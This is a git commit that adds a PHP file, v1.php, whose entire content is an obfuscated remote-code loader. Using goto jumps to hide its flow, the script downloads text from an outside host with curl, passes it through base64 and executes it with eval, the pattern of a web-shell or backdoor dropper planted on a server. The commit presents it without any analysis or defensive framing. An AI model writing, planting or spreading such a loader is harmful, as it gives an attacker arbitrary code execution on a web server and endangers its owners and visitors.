795d1fbc1aea3cc766603ba14b7e3d496fad54d4
Veccy <107405609+qeize@users.noreply.github.com>
2025-06-21 20:20:43 +0700

    Add files via upload

---
+++ v1.php
@@ -0,0 +1,28 @@
+<?php
+goto start;
+
+decode:
+$code = base64_decode($encoded);
+eval('?>' . $code);
+goto end;
+
+start:
+$url = 'https://v1.javpornsub.net/5.txt';
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+$response = curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($http_code === 200 && $response !== false) {
+    $encoded = base64_encode($response);
+    goto decode;
+} else {
+    echo "Gagal mengambil kode dari URL.";
+}
+
+end:
+?>
